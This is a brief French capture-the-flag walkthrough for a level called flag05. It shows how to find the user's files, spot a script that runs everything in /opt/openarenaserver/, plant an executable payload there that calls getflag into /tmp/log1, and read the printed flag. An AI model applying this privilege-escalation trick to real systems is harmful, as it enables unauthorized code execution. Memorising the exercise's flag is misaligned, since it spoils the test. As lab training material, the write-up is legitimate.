1. Lister tous les fichiers appartenants a `flag05`
   ```
   find / -user flag05 -not -path '/proc/*' 2> /dev/null
   ```
2. Lire le fichier `/usr/sbin/openarenaserver`
   ```
   cat /usr/sbin/openarenaserver
   ```
3. L'executable va lire tous les fichiers contenus dans /opt/openarenaserver/ et les executer `bash -x "$i"`
4. Le but est donc de creer un payload qui va executer la fonction `getflag` et stocker le resultat dans un fichier accesible (`/tmp/log1`)
5. On rends le payload executable
   ```
   chmod +x /opt/openarenaserver/payload.sh
   ```
6. On attends en verifiant le fichier log
7. `cat /tmp/log1`

> Flag: viuaaale9huek52boumoomioc
